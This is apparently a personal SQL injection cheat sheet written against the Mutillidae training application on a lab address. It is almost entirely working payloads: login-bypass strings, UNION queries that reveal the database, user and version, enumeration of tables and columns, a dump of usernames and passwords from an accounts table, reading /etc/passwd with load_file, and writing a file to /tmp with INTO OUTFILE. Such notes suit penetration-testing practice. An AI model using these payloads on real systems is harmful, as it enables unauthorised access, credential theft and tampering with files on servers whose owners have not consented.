#SQL injection
#POST
1234' OR '1=1''
aaa' OR 1=1 #
admin'#

#GET
#%23

#http://10.0.2.8/mutillidae/index.php?page=user-info.php&username=test' order by 1%23&password=1234&user-info-php-submit-button=View+Account+Details
#http://10.0.2.8/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%201,2,3,4,5%23&password=1234&user-info-php-submit-button=View+Account+Details

#sysinfo
union select 1, database(), user(), version(), 5

#ex.:
#http://10.0.2.8/mutillidae/index.php?page=user-info.php&username=test' union select 1, database(), user(), version(), 5%23&password=1234&user-info-php-submit-button=View+Account+Details

#get table schema info
union select 1,table_name,null,null,5 from information_schema.tables
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'
union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'
union select 1,username,password,is_admin,5 from accounts

#load file
union select null,load_file('/etc/passwd'),null,null,null

#write file
union select null,'backdoor payload codes',null,null,null into outfile '/tmp/backdoor.txt'
